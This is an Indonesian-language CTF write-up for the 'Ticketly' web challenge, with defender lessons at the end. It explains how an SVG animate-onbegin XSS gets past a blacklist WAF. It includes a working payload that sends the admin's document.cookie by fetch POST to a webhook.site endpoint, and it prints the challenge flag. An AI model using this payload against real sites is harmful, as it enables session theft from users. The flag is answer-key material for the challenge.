---
ctf: "BDSec CTF 2026"
kategori: "Web"
challenge: "Ticketly"
flag: "bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}"
teknik: "WAF blacklist (script/iframe/img/javascript:/onload) dilewati lewat SVG SMIL <animate onbegin>; eksfiltrasi cookie admin bot lewat chunked POST ke webhook"
sumber: "https://github.com/Abdelkad3r/BDSecCTF-2026"
---

# Ticketly — BDSec CTF 2026 (Web, 425 poin)

## Deskripsi Singkat

Aplikasi support-ticket di mana user terdaftar mensubmit body ticket HTML-capable dan melaporkannya untuk review admin bot. Server menerapkan WAF blacklist yang menolak atau menghapus `<script>`, `<iframe>`, `<img>`, `javascript:`, dan `onload`. Tag SVG lolos tanpa perubahan.

## Analisis

Alur exploit-nya: `register → login → buat ticket (body XSS) → report ticket → admin bot mengunjungi → XSS terpicu → cookie tereksfiltrasi`.

**Konfirmasi rendering HTML.** Submit `body=<b>hello</b>` — tag `<b>` bertahan di output. Aplikasinya merender HTML yang disuplai user secara verbatim (atau nyaris verbatim).

**Pemetaan WAF.** Payload yang jelas-jelas ditolak: `<script>`, `<iframe src=javascript:…>`, `<img src=x onerror=…>`, `<a href="javascript:…">`, `<body onload=…>`. Filter-nya berbasis-string, menangkap: `script`, `iframe`, `img`, `javascript:`, `onload` — blacklist XSS minimal klasik, daftar yang sama yang muncul di lusinan konfigurasi WAF "quick fix" dan contoh OWASP entry-level.

Memprobe apa yang **tidak** diblokir: `<svg></svg>` lolos. `<svg><animate attributeName=x dur=1s></animate></svg>` juga lolos — WAF-nya tidak punya entri untuk `animate`, `svg`, `attributeName`, atau `dur`. Yang terpenting, `onbegin` juga lolos:

```html
<svg>
  <animate attributeName=opacity from=0 to=1 dur=1s begin=0s
    onbegin="alert(document.domain)">
  </animate>
</svg>
```

Di Chromium headless, animasi SVG SMIL dengan `begin=0s` mulai seketika saat halaman di-parse, dan `onbegin` terpicu bersamaan — **tanpa gesture user**. Payload-nya berjalan otomatis. Terverifikasi dengan payload yang mengarahkan `location` ke webhook — request masuk, eksekusi terkonfirmasi.

## Eksploitasi / Solusi

Bot admin mengunjungi `/admin/ticket/:id` dengan cookie yang membawa flag. Payload eksfiltrasi butuh membaca `document.cookie`, lalu mengirimkannya ke webhook terkontrol — dipecah jadi beberapa chunked POST request (no-cors) karena panjang URL/body terbatas:

```html
<svg>
  <animate attributeName=opacity from=0 to=1 dur=1s begin=0s
    onbegin="fetch('https://webhook.site/<uuid>', {method:'POST', mode:'no-cors', body: document.cookie})">
  </animate>
</svg>
```

Submit sebagai body ticket, report ticket-nya. Bot admin mengunjungi, animasi terpicu, `document.cookie` (berisi `flag=bdsec{...}`) terkirim ke webhook.

```
bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```

## Catatan / Insight

**Pelajaran untuk defender:** **allowlist sanitization adalah satu-satunya pendekatan aman untuk HTML tak-terpercaya.** DOMPurify (berbasis-allowlist) akan menghapus payload `<animate onbegin>` dalam satu panggilan. Pendekatan berbasis-blacklist apa pun adalah proyek riset untuk attacker — mereka secara harfiah mencari permukaan eksekusi browser untuk satu jalur yang tidak disebut blacklist-nya, dan browser itu luas. OWASP XSS cheat sheet mencapai ratusan konteks eksekusi spesifik-browser lintas HTML, SVG, MathML, CSS expression, dan skema data URI. Tidak ada blacklist buatan-tangan yang mencakup semuanya.

## Flag

```
bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```
